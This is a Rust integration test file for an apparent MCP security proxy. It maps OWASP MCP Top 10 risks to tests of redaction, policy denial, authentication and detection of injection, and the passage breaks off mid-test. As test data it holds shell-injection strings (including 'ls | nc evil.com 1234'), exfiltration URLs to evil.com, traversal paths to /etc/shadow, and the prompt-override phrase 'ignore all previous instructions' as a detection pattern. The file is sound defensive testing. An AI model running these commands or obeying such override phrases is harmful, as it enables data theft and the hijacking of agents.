// Copyright 2026 Paolo Vella
// SPDX-License-Identifier: BUSL-1.1
//
// Use of this software is governed by the Business Source License
// included in the LICENSE-BSL-1.1 file at the root of this repository.
//
// Change Date: Three years from the date of publication of this version.
// Change License: MPL-2.0

//! OWASP MCP Top 10 Test Coverage Matrix
//!
//! Per Directive C-8.4: Maps each OWASP MCP risk to Vellaveto's coverage
//! and verifies protections with integration tests.
//!
//! | OWASP Risk                    | Vellaveto Coverage              | Status     |
//! |-------------------------------|--------------------------------|------------|
//! | MCP01 Token Mismanagement     | Audit redaction                | GOOD       |
//! | MCP02 Tool Access Control     | Policy engine                  | GOOD       |
//! | MCP03 Tool Poisoning          | Rug-pull detection + allowlist | GOOD       |
//! | MCP04 Privilege Escalation    | Deny-override                  | GOOD       |
//! | MCP05 Command Injection       | Param constraints              | GOOD       |
//! | MCP06 Prompt Injection        | Response injection scanning    | GOOD       |
//! | MCP07 Auth                    | Bearer token                   | GOOD       |
//! | MCP08 Audit & Telemetry       | Hash chain                     | EXCELLENT  |
//! | MCP09 Insufficient Logging    | Comprehensive log              | GOOD       |
//! | MCP10 Denial of Service       | Rate limit + caps              | GOOD       |

use serde_json::json;
use std::sync::Arc;
use tempfile::TempDir;
use vellaveto_audit::AuditLogger;
use vellaveto_engine::PolicyEngine;
use vellaveto_types::{Action, Policy, PolicyType, Verdict};

// ═══════════════════════════════════════════════════════════════
// Helpers
// ═══════════════════════════════════════════════════════════════

fn runtime() -> tokio::runtime::Runtime {
    tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .expect("failed to create tokio runtime")
}

fn make_action(tool: &str, function: &str, params: serde_json::Value) -> Action {
    Action::new(tool.to_string(), function.to_string(), params)
}

fn deny_policy(id: &str, name: &str, priority: i32) -> Policy {
    Policy {
        id: id.to_string(),
        name: name.to_string(),
        policy_type: PolicyType::Deny,
        priority,
        path_rules: None,
        network_rules: None,
    }
}

fn allow_policy(id: &str, name: &str, priority: i32) -> Policy {
    Policy {
        id: id.to_string(),
        name: name.to_string(),
        policy_type: PolicyType::Allow,
        priority,
        path_rules: None,
        network_rules: None,
    }
}

fn conditional_policy(
    id: &str,
    name: &str,
    priority: i32,
    conditions: serde_json::Value,
) -> Policy {
    Policy {
        id: id.to_string(),
        name: name.to_string(),
        policy_type: PolicyType::Conditional { conditions },
        priority,
        path_rules: None,
        network_rules: None,
    }
}

// ═══════════════════════════════════════════════════════════════
// MCP01 — Token Mismanagement
//
// Risk: Tokens/secrets exposed in audit logs, error messages, or
//       tool parameters leading to credential theft.
// Vellaveto coverage: AuditLogger redacts sensitive keys and value
//       prefixes by default.
// ═══════════════════════════════════════════════════════════════

#[test]
fn test_owasp_mcp01_secrets_redacted_in_audit_log() {
    let rt = runtime();
    rt.block_on(async {
        let tmp = TempDir::new().unwrap();
        let logger = AuditLogger::new(tmp.path().join("audit.log"));

        // Action containing multiple sensitive fields
        let action = make_action(
            "config",
            "set",
            json!({
                "api_key": "sk-proj-abc123secret",
                "password": "hunter2",
                "token": "ghp_xxxxxxxxxxxx",
                "client_secret": "super-secret-value",
                "safe_field": "this-is-fine",
            }),
        );

        logger
            .log_entry(
                &action,
                &Verdict::Allow,
                json!({"authorization": "Bearer abc"}),
            )
            .await
            .unwrap();

        let entries = logger.load_entries().await.unwrap();
        assert_eq!(entries.len(), 1);

        let params = &entries[0].action.parameters;
        // Sensitive keys must be redacted
        assert_eq!(params["api_key"], "[REDACTED]", "api_key must be redacted");
        assert_eq!(
            params["password"], "[REDACTED]",
            "password must be redacted"
        );
        assert_eq!(params["token"], "[REDACTED]", "token must be redacted");
        assert_eq!(
            params["client_secret"], "[REDACTED]",
            "client_secret must be redacted"
        );
        // Non-sensitive field preserved
        assert_eq!(params["safe_field"], "this-is-fine");

        // Metadata redaction
        let metadata = &entries[0].metadata;
        assert_eq!(
            metadata["authorization"], "[REDACTED]",
            "Bearer token in metadata must be redacted"
        );
    });
}

#[test]
fn test_owasp_mcp01_value_prefix_redaction() {
    let rt = runtime();
    rt.block_on(async {
        let tmp = TempDir::new().unwrap();
        let logger = AuditLogger::new(tmp.path().join("audit.log"));

        // Values with sensitive prefixes should be redacted regardless of key name
        let action = make_action(
            "tool",
            "func",
            json!({
                "openai_config": "sk-proj-should-be-redacted",
                "aws_id": "AKIA1234567890EXAMPLE",
                "github_token": "ghp_1234567890abcdef",
                "slack_bot": "xoxb-something-secret",
                "normal_value": "just-a-normal-string",
            }),
        );

        logger
            .log_entry(&action, &Verdict::Allow, json!({}))
            .await
            .unwrap();

        let entries = logger.load_entries().await.unwrap();
        let params = &entries[0].action.parameters;

        assert_eq!(params["openai_config"], "[REDACTED]", "sk- prefix redacted");
        assert_eq!(params["aws_id"], "[REDACTED]", "AKIA prefix redacted");
        assert_eq!(params["github_token"], "[REDACTED]", "ghp_ prefix redacted");
        assert_eq!(params["slack_bot"], "[REDACTED]", "xoxb- prefix redacted");
        assert_eq!(params["normal_value"], "just-a-normal-string");
    });
}

#[test]
fn test_owasp_mcp01_nested_secret_redaction() {
    let rt = runtime();
    rt.block_on(async {
        let tmp = TempDir::new().unwrap();
        let logger = AuditLogger::new(tmp.path().join("audit.log"));

        // Secrets buried in nested structures must still be redacted
        let action = make_action(
            "tool",
            "func",
            json!({
                "config": {
                    "auth": {
                        "password": "deeply-nested-secret",
                        "username": "visible"
                    }
                },
                "items": [
                    {"secret": "array-secret"},
                    {"name": "visible-item"}
                ]
            }),
        );

        logger
            .log_entry(&action, &Verdict::Allow, json!({}))
            .await
            .unwrap();

        let entries = logger.load_entries().await.unwrap();
        let params = &entries[0].action.parameters;

        assert_eq!(
            params["config"]["auth"]["password"], "[REDACTED]",
            "Nested password must be redacted"
        );
        assert_eq!(params["config"]["auth"]["username"], "visible");
        assert_eq!(
            params["items"][0]["secret"], "[REDACTED]",
            "Secret in array must be redacted"
        );
        assert_eq!(params["items"][1]["name"], "visible-item");
    });
}

#[test]
fn test_owasp_mcp01_hash_chain_valid_after_redaction() {
    let rt = runtime();
    rt.block_on(async {
        let tmp = TempDir::new().unwrap();
        let logger = AuditLogger::new(tmp.path().join("audit.log"));

        // Log entries with secrets — redaction must not break the hash chain
        for i in 0..5 {
            let action = make_action(
                "tool",
                "func",
                json!({"password": format!("secret-{}", i), "index": i}),
            );
            logger
                .log_entry(&action, &Verdict::Allow, json!({}))
                .await
                .unwrap();
        }

        let verification = logger.verify_chain().await.unwrap();
        assert!(
            verification.valid,
            "Hash chain must remain valid after redaction"
        );
        assert_eq!(verification.entries_checked, 5);
    });
}

// ═══════════════════════════════════════════════════════════════
// MCP02 — Tool Access Control
//
// Risk: Unauthorized tool access when policies are not enforced.
// Vellaveto coverage: Policy engine with priority-based evaluation,
//       wildcard matching, and fail-closed default.
// ═══════════════════════════════════════════════════════════════

#[test]
fn test_owasp_mcp02_deny_rule_blocks_tool() {
    let engine = PolicyEngine::new(false);
    let action = make_action("bash", "exec", json!({"command": "rm -rf /"}));
    let policies = vec![deny_policy("bash:*", "Block all bash", 100)];

    let verdict = engine.evaluate_action(&action, &policies).unwrap();
    assert!(
        matches!(verdict, Verdict::Deny { .. }),
        "Deny policy must block bash tool: got {verdict:?}"
    );
}

#[test]
fn test_owasp_mcp02_no_matching_policy_denies() {
    let engine = PolicyEngine::new(false);
    // Action that doesn't match any policy
    let action = make_action("unknown_tool", "unknown_func", json!({}));
    let policies = vec![allow_policy("file:read", "Allow file reads", 10)];

    let verdict = engine.evaluate_action(&action, &policies).unwrap();
    assert!(
        matches!(verdict, Verdict::Deny { .. }),
        "Unmatched action must be denied (fail-closed): got {verdict:?}"
    );
}

#[test]
fn test_owasp_mcp02_empty_policy_list_denies() {
    let engine = PolicyEngine::new(false);
    let action = make_action("file", "read", json!({}));

    let verdict = engine.evaluate_action(&action, &[]).unwrap();
    assert!(
        matches!(verdict, Verdict::Deny { .. }),
        "Empty policy list must deny all (fail-closed): got {verdict:?}"
    );
}

#[test]
fn test_owasp_mcp02_wildcard_policy_catches_all() {
    let engine = PolicyEngine::new(false);
    let policies = vec![deny_policy("*:*", "Block everything", 100)];

    // Every tool:function combo should be blocked
    for (tool, func) in &[("file", "read"), ("bash", "exec"), ("net", "connect")] {
        let action = make_action(tool, func, json!({}));
        let verdict = engine.evaluate_action(&action, &policies).unwrap();
        assert!(
            matches!(verdict, Verdict::Deny { .. }),
            "*:* must deny {tool}:{func}: got {verdict:?}"
        );
    }
}

#[test]
fn test_owasp_mcp02_specific_deny_overrides_broad_allow() {
    let engine = PolicyEngine::new(false);
    let mut policies = vec![
        allow_policy("*:*", "Allow all", 10),
        deny_policy("bash:exec", "Block bash exec", 100),
    ];
    PolicyEngine::sort_policies(&mut policies);

    let action = make_action("bash", "exec", json!({}));
    let verdict = engine.evaluate_action(&action, &policies).unwrap();
    assert!(
        matches!(verdict, Verdict::Deny { .. }),
        "Higher-priority deny must override broad allow: got {verdict:?}"
    );
}

// ═══════════════════════════════════════════════════════════════
// MCP03 — Tool Poisoning (Rug Pull / Schema Manipulation)
//
// Risk: Malicious MCP server changes tool definitions between
//       sessions to alter behavior after initial approval.
// Vellaveto coverage: GOOD —
//   1. Policy engine denies tools not in allowlist (fail-closed)
//   2. Proxy tracks tool annotations from tools/list responses
//   3. Rug-pull detection: annotation changes trigger audit entries
//   4. Proxy-level unit tests: test_extract_tool_annotations_*,
//      test_extract_tool_annotations_rug_pull_detection (vellaveto-mcp)
// ═══════════════════════════════════════════════════════════════

#[test]
fn test_owasp_mcp03_unknown_tool_denied_by_allowlist() {
    let engine = PolicyEngine::new(false);
    let policies = vec![allow_policy("file:read", "Allow file reads only", 100)];

    // A "poisoned" tool (not in the allow list) is denied
    let action = make_action("file", "write", json!({"path": "/etc/passwd"}));
    let verdict = engine.evaluate_action(&action, &policies).unwrap();
    assert!(
        matches!(verdict, Verdict::Deny { .. }),
        "Unknown tool function must be denied: got {verdict:?}"
    );
}

#[test]
fn test_owasp_mcp03_rug_pull_audit_entry_format() {
    // Rug-pull detection creates audit entries with specific format.
    // Verify the audit system correctly records annotation-change events.
    let rt = runtime();
    rt.block_on(async {
        let tmp = TempDir::new().unwrap();
        let logger = AuditLogger::new(tmp.path().join("audit.log"));

        // Simulate what the proxy logs when it detects a rug-pull
        let action = make_action(
            "vellaveto",
            "tool_annotation_change",
            json!({
                "changed_tools": ["dangerous_tool"],
                "total_tools": 5
            }),
        );
        let verdict = Verdict::Deny {
            reason: "Tool annotation change detected for: dangerous_tool".to_string(),
        };
        logger
            .log_entry(
                &action,
                &verdict,
                json!({"source": "proxy", "event": "rug_pull_detection"}),
            )
            .await
            .unwrap();

        let entries = logger.load_entries().await.unwrap();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].action.tool, "vellaveto");
        assert_eq!(entries[0].action.function, "tool_annotation_change");
        assert_eq!(
            entries[0].action.parameters["changed_tools"][0],
            "dangerous_tool"
        );
        assert_eq!(entries[0].metadata["event"], "rug_pull_detection");
        assert!(matches!(entries[0].verdict, Verdict::Deny { .. }));
    });
}

#[test]
fn test_owasp_mcp03_strict_allowlist_blocks_all_unknown() {
    let engine = PolicyEngine::new(false);
    let policies = vec![
        allow_policy("file:read", "Only file:read allowed", 100),
        deny_policy("*:*", "Deny everything else", 1),
    ];

    // Various poisoned tool names that should all be denied
    let poisoned = vec![
        ("file", "write"),
        ("file", "delete"),
        ("bash", "exec"),
        ("net", "connect"),
        ("system", "eval"),
    ];

    for (tool, func) in poisoned {
        let action = make_action(tool, func, json!({}));
        let mut sorted = policies.clone();
        PolicyEngine::sort_policies(&mut sorted);
        let verdict = engine.evaluate_action(&action, &sorted).unwrap();
        assert!(
            matches!(verdict, Verdict::Deny { .. }),
            "Poisoned tool {tool}:{func} must be denied: got {verdict:?}"
        );
    }
}

// ═══════════════════════════════════════════════════════════════
// MCP04 — Privilege Escalation
//
// Risk: Lower-privilege user/tool gains higher privileges through
//       policy bypass or misconfiguration.
// Vellaveto coverage: Priority-based deny-override ensures deny
//       rules at equal priority always win over allow rules.
// ═══════════════════════════════════════════════════════════════

#[test]
fn test_owasp_mcp04_deny_wins_at_equal_priority() {
    let engine = PolicyEngine::new(false);
    let mut policies = vec![
        allow_policy("bash:*", "Allow bash", 100),
        deny_policy("bash:*", "Deny bash", 100),
    ];
    PolicyEngine::sort_policies(&mut policies);

    let action = make_action("bash", "exec", json!({}));
    let verdict = engine.evaluate_action(&action, &policies).unwrap();
    assert!(
        matches!(verdict, Verdict::Deny { .. }),
        "At equal priority, deny must win over allow (deny-override): got {verdict:?}"
    );
}

#[test]
fn test_owasp_mcp04_cannot_escalate_with_lower_priority_allow() {
    let engine = PolicyEngine::new(false);
    let mut policies = vec![
        deny_policy("bash:*", "Block bash", 100),
        allow_policy("bash:*", "Try to override deny", 50),
    ];
    PolicyEngine::sort_policies(&mut policies);

    let action = make_action("bash", "exec", json!({}));
    let verdict = engine.evaluate_action(&action, &policies).unwrap();
    assert!(
        matches!(verdict, Verdict::Deny { .. }),
        "Lower-priority allow must not override higher-priority deny: got {verdict:?}"
    );
}

#[test]
fn test_owasp_mcp04_require_approval_for_sensitive_operations() {
    let engine = PolicyEngine::new(false);
    let policies = vec![conditional_policy(
        "deploy:*",
        "Require approval for deploys",
        100,
        json!({"require_approval": true}),
    )];

    let action = make_action("deploy", "production", json!({}));
    let verdict = engine.evaluate_action(&action, &policies).unwrap();
    assert!(
        matches!(verdict, Verdict::RequireApproval { .. }),
        "Sensitive operations must require approval: got {verdict:?}"
    );
}

#[test]
fn test_owasp_mcp04_forbidden_parameters_prevent_escalation() {
    let engine = PolicyEngine::new(false);
    // Policy that blocks attempts to pass "admin" or "sudo" parameters
    let policies = vec![conditional_policy(
        "tool:*",
        "Block admin params",
        100,
        json!({"forbidden_parameters": ["admin", "sudo", "root"]}),
    )];

    let action = make_action("tool", "func", json!({"admin": true, "data": "ok"}));
    let verdict = engine.evaluate_action(&action, &policies).unwrap();
    assert!(
        matches!(verdict, Verdict::Deny { .. }),
        "Forbidden parameter 'admin' must cause denial: got {verdict:?}"
    );
}

// ═══════════════════════════════════════════════════════════════
// MCP05 — Command Injection
//
// Risk: Attacker injects shell commands or path traversals via
//       tool parameters.
// Vellaveto coverage: Parameter constraints with regex, glob,
//       domain_match, and deep parameter scanning.
// ═══════════════════════════════════════════════════════════════

#[test]
fn test_owasp_mcp05_path_traversal_blocked_by_constraint() {
    let engine = PolicyEngine::new(false);
    let policies = vec![conditional_policy(
        "file:*",
        "Block path traversal to /etc",
        100,
        json!({
            "parameter_constraints": [{
                "param": "path",
                "op": "glob",
                "pattern": "/etc/**",
                "on_match": "deny"
            }]
        }),
    )];

    // Direct path
    let action = make_action("file", "read", json!({"path": "/etc/passwd"}));
    let verdict = engine.evaluate_action(&action, &policies).unwrap();
    assert!(
        matches!(verdict, Verdict::Deny { .. }),
        "/etc/passwd must be blocked: got {verdict:?}"
    );

    // Traversal attempt — normalize_path strips traversal before constraint check
    let action2 = make_action("file", "read", json!({"path": "/tmp/../etc/shadow"}));
    let verdict2 = engine.evaluate_action(&action2, &policies).unwrap();
    assert!(
        matches!(verdict2, Verdict::Deny { .. }),
        "Traversal to /etc must be blocked: got {verdict2:?}"
    );
}

#[test]
fn test_owasp_mcp05_regex_blocks_shell_metacharacters() {
    let engine = PolicyEngine::new(false);
    // Regex constraint that blocks common shell injection patterns
    let policies = vec![conditional_policy(
        "bash:*",
        "Block shell injection",
        100,
        json!({
            "parameter_constraints": [{
                "param": "command",
                "op": "regex",
                "pattern": "[;&|`$]",
                "on_match": "deny"
            }]
        }),
    )];

    let injection_attempts = vec![
        ("ls; rm -rf /", "semicolon injection"),
        ("echo hello && cat /etc/passwd", "ampersand chaining"),
        ("ls | nc evil.com 1234", "pipe injection"),
        ("echo `whoami`", "backtick injection"),
        ("echo $(id)", "subshell injection"),
    ];

    for (cmd, desc) in injection_attempts {
        let action = make_action("bash", "exec", json!({"command": cmd}));
        let verdict = engine.evaluate_action(&action, &policies).unwrap();
        assert!(
            matches!(verdict, Verdict::Deny { .. }),
            "{desc} must be blocked: got {verdict:?}"
        );
    }
}

#[test]
fn test_owasp_mcp05_domain_constraint_blocks_exfiltration() {
    let engine = PolicyEngine::new(false);
    let policies = vec![conditional_policy(
        "http:*",
        "Block evil domain",
        100,
        json!({
            "parameter_constraints": [{
                "param": "url",
                "op": "domain_match",
                "pattern": "*.evil.com",
                "on_match": "deny"
            }]
        }),
    )];

    let exfil_attempts = vec![
        "https://data.evil.com/collect",
        "https://api.evil.com/exfil?data=secret",
        "http://sub.sub.evil.com/",
    ];

    for url in exfil_attempts {
        let action = make_action("http", "request", json!({"url": url}));
        let verdict = engine.evaluate_action(&action, &policies).unwrap();
        assert!(
            matches!(verdict, Verdict::Deny { .. }),
            "Exfiltration to {url} must be blocked: got {verdict:?}"
        );
    }
}

#[test]
fn test_owasp_mcp05_deep_parameter_scanning() {
    let engine = PolicyEngine::new(false);
    // Wildcard param scanning catches secrets buried in nested structures
    let policies = vec![conditional_policy(
        "*:*",
        "Block any path to /etc",
        100,
        json!({
            "parameter_constraints": [{
                "param": "*",
                "op": "glob",
                "pattern": "/etc/**",
                "on_match": "deny"
            }]
        }),
    )];

    // Path buried in nested params
    let action = make_action(
        "tool",
        "func",
        json!({
            "config": {
                "nested": {
                    "path": "/etc/shadow"
                }
            }
        }),
    );
    let verdict = engine.evaluate_action(&action, &policies).unwrap();
    assert!(
        matches!(verdict, Verdict::Deny { .. }),
        "Deep-nested /etc path must be caught by wildcard scan: got {verdict:?}"
    );
}

#[test]
fn test_owasp_mcp05_normalize_path_prevents_encoded_traversal() {
    // Percent-encoded traversal must be decoded and blocked
    let normalized = PolicyEngine::normalize_path("/%2e%2e/%2e%2e/etc/passwd").unwrap();
    assert_eq!(
        normalized, "/etc/passwd",
        "Encoded traversal must be decoded and resolved"
    );
    assert!(
        !normalized.contains(".."),
        "No traversal sequences must remain"
    );

    // Double-encoding
    let double = PolicyEngine::normalize_path("/%252e%252e/etc/passwd").unwrap();
    assert!(
        !double.contains(".."),
        "Double-encoded traversal must be resolved"
    );
}

// ═══════════════════════════════════════════════════════════════
// MCP06 — Prompt Injection via Tool Results
//
// Risk: Malicious MCP server returns tool results containing
//       prompt injection (e.g., "IGNORE ALL PREVIOUS INSTRUCTIONS").
// Vellaveto coverage: GOOD —
//   1. Proxy scans all child responses for 15+ injection patterns
//   2. Detections are logged in audit trail (log-only mode)
//   3. Scans both content[].text and structuredContent
//   4. Proxy-level unit tests: test_inspect_response_injection_*
//      (vellaveto-mcp)
// ═══════════════════════════════════════════════════════════════

#[test]
fn test_owasp_mcp06_injection_audit_entry_format() {
    // Response injection scanning creates audit entries with specific format.
    // Verify the audit system correctly records injection detection events.
    let rt = runtime();
    rt.block_on(async {
        let tmp = TempDir::new().unwrap();
        let logger = AuditLogger::new(tmp.path().join("audit.log"));

        // Simulate what the proxy logs when it detects injection patterns
        let action = make_action(
            "vellaveto",
            "response_inspection",
            json!({
                "matched_patterns": [
                    "ignore all previous instructions",
                    "new system prompt"
                ],
                "response_id": 42
            }),
        );
        let verdict = Verdict::Deny {
            reason: "Prompt injection patterns detected in tool response".to_string(),
        };
        logger
            .log_entry(
                &action,
                &verdict,
                json!({"source": "proxy", "event": "response_injection_detected"}),
            )
            .await
            .unwrap();

        let entries = logger.load_entries().await.unwrap();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].action.tool, "vellaveto");
        assert_eq!(entries[0].action.function, "response_inspection");
        assert_eq!(
            entries[0].action.parameters["matched_patterns"][0],
            "ignore all previous instructions"
        );
        assert_eq!(entries[0].metadata["event"], "response_injection_detected");
        assert!(matches!(entries[0].verdict, Verdict::Deny { .. }));
    });
}

#[test]
fn test_owasp_mcp06_clean_responses_not_flagged() {
    // Clean tool responses should not generate injection audit entries.
    let rt = runtime();
    rt.block_on(async {
        let tmp = TempDir::new().unwrap();
        let logger = AuditLogger::new(tmp.path().join("audit.log"));

        // Normal tool call — should only have a single Allow entry
        let action = make_action(
            "mcp_tool",
            "query",
            json!({"prompt": "summarize this document"}),
        );
        logger
            .log_entry(&action, &Verdict::Allow, json!({"source": "mcp_proxy"}))
            .await
            .unwrap();

        let entries = logger.load_entries().await.unwrap();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].action.tool, "mcp_tool");
        assert!(matches!(entries[0].verdict, Verdict::Allow));
        // No injection detection entry should exist
        assert!(
            entries
                .iter()
                .all(|e| e.action.function != "response_inspection"),
            "Clean responses must not generate injection entries"
        );
    });
}

#[test]
fn test_owasp_mcp06_audit_preserves_hash_chain_after_injection() {
    // Injection detection entries must not break the hash chain.
    let rt = runtime();
    rt.block_on(async {
        let tmp = TempDir::new().unwrap();
        let logger = AuditLogger::new(tmp.path().join("audit.log"));

        // Normal entry
        let action1 = make_action("tool", "func", json!({}));
        logger
            .log_entry(&action1, &Verdict::Allow, json!({}))
            .await
            .unwrap();

        // Injection detection entry
        let action2 = make_action(
            "vellaveto",
            "response_inspection",
            json!({"matched_patterns": ["<system>"]}),
        );
        logger
            .log_entry(
                &action2,
                &Verdict::Deny {
                    reason: "Injection detected".to_string(),
                },
                json!({"event": "response_injection_detected"}),
            )
            .await
            .unwrap();

        // Another normal entry
        let action3 = make_action("tool", "func", json!({}));
        logger
            .log_entry(&action3, &Verdict::Allow, json!({}))
            .await
            .unwrap();

        let v = logger.verify_chain().await.unwrap();
        assert!(
            v.valid,
            "Hash chain must remain valid with injection detection entries"
        );
        assert_eq!(v.entries_checked, 3);
    });
}

// ═══════════════════════════════════════════════════════════════
// MCP07 — Authentication & Authorization
//
// Risk: Unauthenticated access to management endpoints allows
//       attackers to read policies, audit logs, approve actions, etc.
// Vellaveto coverage: Bearer token auth middleware on ALL endpoints
//       except /health. All other endpoints (including /api/metrics
//       and /metrics) require auth when configured (R38-SRV-1).
// ═══════════════════════════════════════════════════════════════

mod owasp_mcp07_auth {
    use arc_swap::ArcSwap;
    use axum::body::Body;
    use axum::http::{Request, StatusCode};
    use std::sync::Arc;
    use tempfile::TempDir;
    use tower::ServiceExt;
    use vellaveto_approval::ApprovalStore;
    use vellaveto_audit::AuditLogger;
    use vellaveto_engine::PolicyEngine;
    use vellaveto_server::{routes, AppState, Metrics, RateLimits};
    use vellaveto_types::{Policy, PolicyType};

    fn make_state(api_key: Option<&str>) -> (AppState, TempDir) {
        let tmp = TempDir::new().unwrap();
        let audit = Arc::new(AuditLogger::new(tmp.path().join("audit.log")));
        let state = AppState {
            policy_state: Arc::new(ArcSwap::from_pointee(vellaveto_server::PolicySnapshot {
                engine: PolicyEngine::new(false),
                policies: vec![Policy {
                    id: "file:read".to_string(),
                    name: "Allow file reads".to_string(),
                    policy_type: PolicyType::Allow,
                    priority: 10,
                    path_rules: None,
                    network_rules: None,
                }],
                compliance_config: Default::default(),
            })),
            audit: Arc::clone(&audit),
            config_path: Arc::new("test.toml".to_string()),
            approvals: Arc::new(ApprovalStore::new(
                tmp.path().join("approvals.jsonl"),
                std::time::Duration::from_secs(900),
            )),
            api_key: api_key.map(|k| Arc::new(k.to_string())),
            rate_limits: Arc::new(RateLimits::disabled()),
            cors_origins: vec![],
            metrics: Arc::new(Metrics::default()),
            trusted_proxies: Arc::new(vec![]),
            policy_write_lock: Arc::new(tokio::sync::Mutex::new(())),
            prometheus_handle: None,
            tool_registry: None,
            cluster: None,
            rbac_config: vellaveto_server::rbac::RbacConfig::default(),
            tenant_config: vellaveto_server::tenant::TenantConfig::default(),
            tenant_store: None,
            tenant_rate_limiter: Arc::new(vellaveto_server::PerTenantRateLimiter::new()),
            idempotency: vellaveto_server::idempotency::IdempotencyStore::new(
                vellaveto_server::idempotency::IdempotencyConfig::default(),
            ),
            signup_lock: std::sync::Arc::new(tokio::sync::Mutex::new(())),
            webhook_dedup: std::sync::Arc::new(vellaveto_server::routes::billing::WebhookDedup::new(std::time::Duration::from_secs(600))),
            task_state: None,
            auth_level: None,
            iam_state: None,
            circuit_breaker: None,
            deputy: None,
            shadow_agent: None,
            schema_lineage: None,
            sampling_detector: None,
            exec_graph_store: None,
            etdi_store: None,
            etdi_verifier: None,
            etdi_attestations: None,
            etdi_version_pins: None,
            memory_security: None,
            nhi: None,
            observability: None,
            shadow_ai_discovery: None,
            least_agency_tracker: None,
            // Server Configuration (FIND-004, FIND-005)
            metrics_require_auth: true,
            audit_strict_mode: false,
            leader_election: None,
            service_discovery: None,
            deployment_config: Default::default(),
            start_time: std::time::Instant::now(),
            cached_discovered_endpoints: std::sync::Arc::new(std::sync::atomic::AtomicU64::new(0)),
            cached_instance_id: std::sync::Arc::new("test-instance".to_string()),
            discovery_engine: None,
            discovery_audit: None,
            projector_registry: None,
            zk_proofs: None,
            zk_audit_enabled: false,
            zk_audit_config: Default::default(),
            federation_resolver: None,
            billing_config: std::sync::Arc::new(vellaveto_server::BillingState {
                paddle: Default::default(),
                stripe: Default::default(),
                enabled: false,
                licensing_validation: vellaveto_config::LicenseValidation {
                    tier: vellaveto_config::LicenseTier::Community,
                    limits: vellaveto_config::LicenseTier::Community.limits(),
                    customer_id: None,
                    max_nodes: None,
                    max_endpoints: None,
                    reason: "test default".to_string(),
                },
            }),
            setup_completed: Arc::new(std::sync::atomic::AtomicBool::new(false)),
            wizard_sessions: Arc::new(dashmap::DashMap::new()),
            audit_query: Arc::new(vellaveto_audit::query::file::FileAuditQuery::new(
                Arc::clone(&audit),
            )),
            audit_store_status: vellaveto_types::audit_store::AuditStoreStatus {
                enabled: false,
                backend: vellaveto_types::audit_store::AuditStoreBackend::File,
                sink_healthy: false,
                pending_count: 0,
            },
            policy_lifecycle_store: None,
            policy_lifecycle_config: Default::default(),
            staging_snapshot: Arc::new(arc_swap::ArcSwap::from_pointee(None)),
            usage_tracker: None,
            topology_guard: None,
            topology_probe: None,
            recrawl_trigger: None,
        };
        (state, tmp)
    }

    #[tokio::test]
    async fn test_owasp_mcp07_evaluate_requires_auth() {
        let (state, _tmp) = make_state(Some("secure-key"));
        let app = routes::build_router(state);

        let req = Request::post("/api/evaluate")
            .header("content-type", "application/json")
            .body(Body::from(
                r#"{"tool":"file","function":"read","parameters":{}}"#,
            ))
            .unwrap();

        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::UNAUTHORIZED,
            "POST /api/evaluate without auth must be 401"
        );
    }

    #[tokio::test]
    async fn test_owasp_mcp07_policy_mutation_requires_auth() {
        let (state, _tmp) = make_state(Some("secure-key"));
        let app = routes::build_router(state);

        let req = Request::post("/api/policies")
            .header("content-type", "application/json")
            .body(Body::from(
                r#"{"id":"evil:*","name":"Evil","policy_type":"Allow","priority":999}"#,
            ))
            .unwrap();

        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::UNAUTHORIZED,
            "POST /api/policies without auth must be 401"
        );
    }

    #[tokio::test]
    async fn test_owasp_mcp07_policy_deletion_requires_auth() {
        let (state, _tmp) = make_state(Some("secure-key"));
        let app = routes::build_router(state);

        let req = Request::delete("/api/policies/file:read")
            .body(Body::empty())
            .unwrap();

        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::UNAUTHORIZED,
            "DELETE /api/policies without auth must be 401"
        );
    }

    #[tokio::test]
    async fn test_owasp_mcp07_approval_resolution_requires_auth() {
        let (state, _tmp) = make_state(Some("secure-key"));
        let app = routes::build_router(state);

        let req = Request::post("/api/approvals/any-id/approve")
            .header("content-type", "application/json")
            .body(Body::empty())
            .unwrap();

        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::UNAUTHORIZED,
            "POST /api/approvals/*/approve without auth must be 401"
        );
    }

    #[tokio::test]
    async fn test_owasp_mcp07_wrong_key_rejected() {
        let (state, _tmp) = make_state(Some("correct-key"));
        let app = routes::build_router(state);

        let req = Request::post("/api/evaluate")
            .header("content-type", "application/json")
            .header("authorization", "Bearer wrong-key")
            .body(Body::from(
                r#"{"tool":"file","function":"read","parameters":{}}"#,
            ))
            .unwrap();

        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::UNAUTHORIZED,
            "Wrong Bearer token must be 401"
        );
    }

    #[tokio::test]
    async fn test_owasp_mcp07_correct_key_succeeds() {
        let (state, _tmp) = make_state(Some("correct-key"));
        let app = routes::build_router(state);

        let req = Request::post("/api/evaluate")
            .header("content-type", "application/json")
            .header("authorization", "Bearer correct-key")
            .body(Body::from(
                r#"{"tool":"file","function":"read","parameters":{}}"#,
            ))
            .unwrap();

        let resp = app.oneshot(req).await.unwrap();
        assert!(
            resp.status().is_success(),
            "Correct Bearer token must succeed, got {}",
            resp.status()
        );
    }

    #[tokio::test]
    async fn test_owasp_mcp07_public_endpoints_open_without_auth() {
        let (state, _tmp) = make_state(Some("secure-key"));

        // Health endpoint — always public
        let app = routes::build_router(state.clone());
        let req = Request::get("/health").body(Body::empty()).unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert!(resp.status().is_success(), "GET /health must be open");

        // R38-SRV-1: /api/metrics now requires auth (exposes policy count)
        let app = routes::build_router(state.clone());
        let req = Request::get("/api/metrics").body(Body::empty()).unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::UNAUTHORIZED,
            "GET /api/metrics must require auth (R38-SRV-1)"
        );
    }

    #[tokio::test]
    async fn test_owasp_mcp07_sensitive_get_endpoints_require_auth() {
        let (state, _tmp) = make_state(Some("secure-key"));

        // GET /api/policies without auth must be rejected
        let app = routes::build_router(state.clone());
        let req = Request::get("/api/policies").body(Body::empty()).unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(
            resp.status(),
